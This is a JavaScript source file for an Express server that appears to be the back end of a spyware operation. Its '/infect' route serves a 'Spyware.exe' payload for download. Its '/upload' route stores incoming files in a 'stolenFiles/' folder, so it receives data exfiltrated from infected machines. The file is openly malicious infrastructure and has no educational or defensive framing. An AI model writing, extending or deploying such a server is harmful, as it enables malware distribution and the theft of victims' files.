import { exec } from 'child_process';
import { ftp } from '../ftp/fptSrv.js';
import cors from 'cors';
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import multer from 'multer';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json());
app.use(cors());
const PORT = 3000;

// Configuración de multer
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, 'stolenFiles/');
    },
    filename: (req, file, cb) => {
        cb(null, `${Date.now()}-${file.originalname}`);
    }
});
const upload = multer({ storage });

app.get('/infect', (req, res) => {
    try {
        const spywareExePath = path.join(__dirname, '../Spyware.exe');
        console.log('Infecting client...');
        console.log(spywareExePath);
        res.download(spywareExePath, 'Spyware.exe');
    } catch (error) {
        console.error('Error infecting:', error);
        res.status(500).json({ error: 'Error infecting' });
        
    }

});

app.post('/upload', upload.single('file'), (req, res) => {
    console.log('Uploading file...');
    console.log(req.file);
    if (!req.file) {
        return res.status(400).send('No file uploaded.');
    }
    console.log(`File uploaded: ${req.file.filename}`);
    res.send(`File uploaded: ${req.file.filename}`);
});

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
    // ftp.start().then(() => {
    //     console.log('FTP server started successfully');
    // }).catch((error) => {
    //     console.error('Failed to start FTP server:', error);
    // });
});